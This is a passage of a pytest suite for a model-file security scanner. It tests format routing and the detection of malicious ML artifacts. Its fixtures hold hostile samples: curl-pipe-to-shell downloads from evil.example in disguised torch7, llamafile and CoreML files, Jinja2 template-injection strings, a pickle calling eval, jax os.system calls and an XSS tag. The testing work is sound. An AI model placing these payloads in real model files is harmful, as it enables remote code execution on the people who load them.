        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_non_jax_identity_value_does_not_merge_jax(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=',"chat_template":"{{ user_name }}","framework":"tensorflow"',
        padding_size=JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 1,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is True
    assert result.scanner_name == "jinja2_template"
    assert "jax_checkpoint" not in result.metadata.get("scanner_dependency_ids", [])
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_tokenizer_json_jax_without_template_does_not_self_merge_jinja(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(',"library":"jax","payload":"jax.experimental.host_callback.call(os.system, \'id\')"'),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
    assert (
        sum(
            check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        == 1
    )


def test_scan_file_tokenizer_json_xgboost_jax_jinja_overlap_does_not_recurse(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
            '"framework":"jax",'
            '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
            '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
        ),
        version_json="[1,7,4]",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert set(result.metadata["scanner_dependency_ids"]) >= {
        "jinja2_template",
        "jax_checkpoint",
        "xgboost",
    }
    assert (
        sum(
            check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        == 1
    )
    assert (
        sum(
            check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        >= 1
    )
    assert (
        sum(
            check.name == "Jinja2 SSTI Analysis Summary" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        == 1
    )
    assert (
        sum(check.name == "JSON Content Analysis" and check.status == CheckStatus.FAILED for check in result.checks)
        == 1
    )


def test_scan_file_tokenizer_json_malformed_after_structure_budget_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 192)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 192)
    tokenizer_path = _write_truncated_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "MXNet Symbol Routing" for check in result.checks)


def test_scan_file_tokenizer_json_duplicate_mxnet_root_after_structure_budget_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"nodes":[],'
            '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
            '"arg_nodes":[0],"heads":[[0,0,0]]'
        ),
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_enabled": False})

    assert result.metadata["analysis_incomplete"] is True
    assert "mxnet_symbol_duplicate_root_keys" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "MXNet Symbol JSON Analysis" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_tokenizer_json_excessive_items_late_chat_template_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"padding_items":['
            + ",".join("0" for _ in range(5000))
            + '],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_config_json_with_tokenizer_schema_still_runs_manifest_controls(tmp_path: Path) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        json.dumps(
            {
                "model_name": "blocked-tokenizer-model",
                "download_url": "https://evil.example/model.bin",
                "sha1": "a" * 40,
                "tokenizer": {
                    "version": "1.0",
                    "added_tokens": [],
                    "model": {"type": "BPE", "vocab": {"hello": 0}},
                },
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(config_path), config={"blacklist_patterns": ["blocked"], "cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert any(
        check.name == "Blacklist Pattern Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(check.name == "Untrusted URL Check" and check.status == CheckStatus.FAILED for check in result.checks)
    assert any(check.name == "Weak Hash Detection" and check.status == CheckStatus.FAILED for check in result.checks)


def test_scan_file_inconclusive_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["jinja2_template"], "cache_scan_results": False},
    )

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_malformed_generation_config_runs_jinja_after_manifest_parse_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        '{"heads":[[0,0,0]],"arg_nodes":[0],'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","padding":"' + ("x" * 300),
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["manifest", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_routes_misnamed_ggml_by_header(tmp_path: Path) -> None:
    disguised_ggml = tmp_path / "model.payload"
    disguised_ggml.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)

    result = scan_file(str(disguised_ggml))

    assert result.scanner_name == "gguf"
    assert result.metadata["format"] == "ggml"
    assert result.metadata["version"] == 1


def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    gguf_path = create_mock_gguf(
        tmp_path / "model.gguf",
        metadata={"tokenizer.chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
    )

    result = scan_file(str(gguf_path), config={"cache_scan_results": False})

    assert result.scanner_name == "gguf"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) -> None:
    near_match = tmp_path / "model.payload"
    near_match.write_bytes(b"GGU?" + b"\x00" * 32)

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_keeps_torch_marker_safetensors_on_safetensors_scanner(tmp_path: Path) -> None:
    file_path = tmp_path / "torch-marker-metadata.safetensors"
    header = {
        "__metadata__": {
            "framework": "torch",
            "kind": "tensor nn.Sequential",
            "description": "<script>alert('xss')</script>",
        },
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    header_bytes = json.dumps(header, separators=(",", ":")).encode()
    file_path.write_bytes(len(header_bytes).to_bytes(8, "little") + header_bytes + b"\x00" * 4)

    result = scan_file(str(file_path))

    assert result.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_torch7_with_misleading_suffix(tmp_path: Path) -> None:
    disguised_torch7 = tmp_path / "payload.jpg"
    disguised_torch7.write_bytes(
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.parametrize("embedded_format", ["cntk", "lightgbm"])
def test_scan_file_prioritizes_malicious_torch7_over_embedded_content_signatures(
    tmp_path: Path,
    embedded_format: str,
) -> None:
    disguised_torch7 = tmp_path / f"payload-{embedded_format}.jpg"
    payload = (
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    if embedded_format == "cntk":
        embedded_payload = tmp_path / "embedded.cmf"
        _write_malicious_cntk(embedded_payload)
        payload += embedded_payload.read_bytes()
    else:
        embedded_payload = tmp_path / "embedded.lgb"
        _write_malicious_lightgbm(embedded_payload)
        payload += b"\x00" + embedded_payload.read_bytes()
    disguised_torch7.write_bytes(payload)

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
def test_scan_file_detects_malicious_torch7_with_recognized_misleading_suffix(
    tmp_path: Path,
    filename: str,
) -> None:
    disguised_torch7 = tmp_path / filename
    disguised_torch7.write_bytes(
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_does_not_route_torch_source_near_match_with_misleading_suffix(tmp_path: Path) -> None:
    source_near_match = tmp_path / "source.jpg"
    source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")

    result = scan_file(str(source_near_match))

    assert result.scanner_name == "unknown"
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_detects_malicious_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "payload.jpg"
    disguised_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(disguised_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_llamafile_with_onnx_suffix(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "payload.onnx"
    disguised_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(disguised_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_benign_llamafile_with_onnx_suffix_reports_format_mismatch(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "safe.onnx"
    disguised_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n--threads 4")

    result = scan_model_directory_or_file(str(disguised_llamafile), cache_scan_results=False)

    assert "llamafile" in result.scanner_names
    assert any(issue.message.startswith("File type validation failed") for issue in result.issues)
    assert core_module.determine_exit_code(result) == 1


def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    result = scan_file(str(generic_executable))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_does_not_route_misleading_suffix_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool.jpg"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    result = scan_file(str(generic_executable))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_middle_marker_llamafile_exe(tmp_path: Path) -> None:
    middle_marker = tmp_path / "middle-marker.exe"
    middle_marker.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(middle_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_tail_marker_llamafile_exe(tmp_path: Path) -> None:
    tail_marker = tmp_path / "tail-marker.exe"
    tail_marker.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * ((8 * 1024 * 1024) + 64) + b"llamafile runtime")

    result = scan_file(str(tail_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_misnamed_onnx_by_header(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = tmp_path / "model.payload"
    create_mock_onnx(disguised_onnx)

    result = scan_file(str(disguised_onnx))

    assert result.scanner_name == "onnx"


def test_scan_file_routes_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "model.pb"
    create_mock_onnx(onnx_pb)

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)


def test_scan_file_attributes_format_mismatch_to_s901(tmp_path: Path) -> None:
    model_path = tmp_path / "model.safetensors"
    malicious_pickle = b"cbuiltins\neval\n(S'1+1'\ntR."
    model_path.write_bytes(zlib.compress(malicious_pickle))

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    format_check = next(
        check for check in result.checks if check.name == "Format Validation" and check.location == str(model_path)
    )
    format_issue = next(
        issue for issue in result.issues if issue.message == format_check.message and issue.location == str(model_path)
    )

    assert format_check.status == CheckStatus.FAILED
    assert format_check.rule_code == "S901"
    assert format_check.details == {
        "extension_format": "safetensors",
        "header_format": "zlib",
        "file_type_validation_failed": True,
    }
    assert format_issue.rule_code == "S901"
    assert any(issue.rule_code == "S104" and "builtins.eval" in issue.message for issue in result.issues)


def test_scan_file_accepts_matching_zlib_format_without_mismatch(tmp_path: Path) -> None:
    model_path = tmp_path / "model.zlib"
    model_path.write_bytes(zlib.compress(b"benign model metadata"))

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "compressed"
    assert result.success is True
    assert not any(check.name == "Format Validation" for check in result.checks)
    assert not any(issue.rule_code == "S901" for issue in result.issues)


def test_scan_file_does_not_attribute_compatible_container_discrepancy_to_s901(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    rule_config = ModelAuditConfig()
    rule_config.severity = {"S901": Severity.CRITICAL}
    set_config(rule_config)

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    format_check = next(
        check for check in result.checks if check.name == "Format Validation" and check.location == str(model_path)
    )
    format_issue = next(
        issue for issue in result.issues if issue.message == format_check.message and issue.location == str(model_path)
    )

    assert result.success is True
    assert format_check.details["file_type_validation_failed"] is False
    assert format_check.rule_code is None
    assert format_check.severity == IssueSeverity.DEBUG
    assert format_issue.rule_code is None
    assert format_issue.severity == IssueSeverity.DEBUG


def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "malicious.pb"
    create_mock_onnx(onnx_pb, op_type="PythonOp")

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )


@pytest.mark.parametrize("prefix", [b"", b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path, prefix: bytes) -> None:
    disguised_coreml = create_mock_coreml(
        tmp_path / "malicious.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())

    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})

    assert result.scanner_name == "coreml"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
        for issue in result.issues
    )


@pytest.mark.parametrize(
    "prefix",
    [
        b"\x08\x08" + (b"\x9a\x06\x00" * 4097),
        b"\x08\x08" + b"\x9b\x06" + (b"\x08\x01" * 4097) + b"\x9c\x06",
    ],
    ids=["top-level-field-budget", "unknown-group-budget"],
)
def test_scan_file_detects_malicious_budget_exhausted_renamed_coreml(tmp_path: Path, prefix: bytes) -> None:
    disguised_coreml = create_mock_coreml(
        tmp_path / "budgeted.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())

    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})

    assert result.scanner_name == "coreml"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "malicious.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=(1024 * 1024) + 32)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )


@pytest.mark.parametrize(
    "prefix",
    [b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06", b"\x08\x08" + (b"\x9a\x06\x00" * 4097)],
    ids=["unknown-field", "unknown-group", "field-budget-candidate"],
)
def test_scan_file_routes_prefixed_misnamed_coreml_nested_in_zip(tmp_path: Path, prefix: bytes) -> None:
    nested_coreml = create_mock_coreml(
        tmp_path / "nested.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    nested_coreml.write_bytes(prefix + nested_coreml.read_bytes())
    archive_path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.write(nested_coreml, arcname="models/nested.jpg")

    result = scan_file(str(archive_path), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_detects_malicious_budget_exhausted_prefixed_renamed_onnx(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=8)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )
    assert core_module.determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("suffix", [".pb", ".bin"])
def test_scan_file_detects_malicious_budget_exhausted_onnx_with_competing_suffix(
    tmp_path: Path,
    suffix: str,
) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / f"many-prefixes{suffix}", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=8)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_detects_malicious_budget_exhausted_group_prefixed_renamed_onnx(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "group-many-prefixes.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_group(disguised_onnx)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_fails_closed_on_budget_exhausted_onnx_flax_overlap(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "flax-overlap.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=100)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_on_budget_exhausted_renamed_onnx_without_structure(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    ambiguous_onnx = tmp_path / "ambiguous.jpg"
    ambiguous_onnx.write_bytes(b"\x4a\x00" * 4097)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(ambiguous_onnx), config=config)
        repeated_result = scan_file(str(ambiguous_onnx), config=config)

        assert result.scanner_name == "unknown"
        assert result.success is True
        assert repeated_result.success is True
        assert result.issues == []
        assert result.metadata["tentative_protobuf_candidate_rejected"] is True
        assert "scan_outcome" not in result.metadata
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(ambiguous_onnx), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 0


def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "malicious.jpg"
    disguised_metagraph.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.message == "Dangerous TensorFlow operation: PyFunc"
        and issue.details.get("op_type") == "PyFunc"
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("filename", "payload_factory", "expected_scanner", "expected_message"),
    [
        (
            "saved.json",
            _build_malicious_tf_savedmodel,
            "tf_savedmodel",
            "PyFunc operation detected",
        ),
        (
            "metagraph.json",
            _build_malicious_tf_metagraph,
            "tf_metagraph",
            "Dangerous TensorFlow operation: PyFunc",
        ),
    ],
)
def test_scan_file_detects_malicious_tensorflow_protobuf_renamed_json(
    tmp_path: Path,
    filename: str,
    payload_factory: Callable[[], bytes],
    expected_scanner: str,
    expected_message: str,
) -> None:
    disguised_tensorflow = tmp_path / filename
    disguised_tensorflow.write_bytes(payload_factory())

    result = scan_file(str(disguised_tensorflow), config={"cache_scan_results": False})

    assert result.scanner_name == expected_scanner
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and expected_message in issue.message for issue in result.issues
    )

    aggregate = scan_model_directory_or_file(str(disguised_tensorflow), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_detects_malicious_renamed_tf_function_metagraph_by_content(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "function-malicious.jpg"
    disguised_metagraph.write_bytes(_build_malicious_tf_function_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert any(issue.details.get("op_type") == "PyFunc" for issue in result.issues)


def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved.jpg"
    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_detects_malicious_tf_savedmodel_renamed_with_meta_suffix(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved.meta"
    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "collection.jpg"
    disguised_savedmodel.write_bytes(_build_collection_only_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)


def test_scan_file_inspects_renamed_tf_metagraph_collection_only_payloads(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "collection-only.jpg"
